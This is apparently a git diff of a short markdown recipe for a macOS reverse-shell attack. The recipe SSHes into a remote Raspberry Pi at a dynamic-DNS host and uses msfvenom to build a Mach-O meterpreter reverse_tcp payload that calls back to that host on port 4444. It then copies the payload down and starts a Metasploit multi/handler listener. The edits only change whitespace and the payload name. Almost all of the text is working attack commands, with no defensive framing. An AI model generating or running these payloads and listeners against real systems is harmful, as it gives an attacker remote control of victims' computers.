@@ -3,7 +3,7 @@
 ### Ingredients
 
 
-### Description 
+### Description
 
 - SSH on remote pi
 
@@ -15,7 +15,7 @@ ssh root@pipeter.asuscomm.com -p 22222
 - Generate Payload
 
 ```
-msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=pipeter.asuscomm.com LPORT=4444 -f macho -o payload
+msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=pipeter.asuscomm.com LPORT=4444 -f macho -o payload
 chmod +x payload
 ```
 
@@ -34,7 +34,7 @@ scp -P 22222 root@pipeter.asuscomm.com:payload ./
 
 msfconsole -q
 use exploit/multi/handler
-set payload osx/x64/meterpreter_reverse_tcp
+set payload osx/x64/meterpreter/reverse_tcp
 set lhost $(getip)
 set lport 4444
 set ExitOnSession false
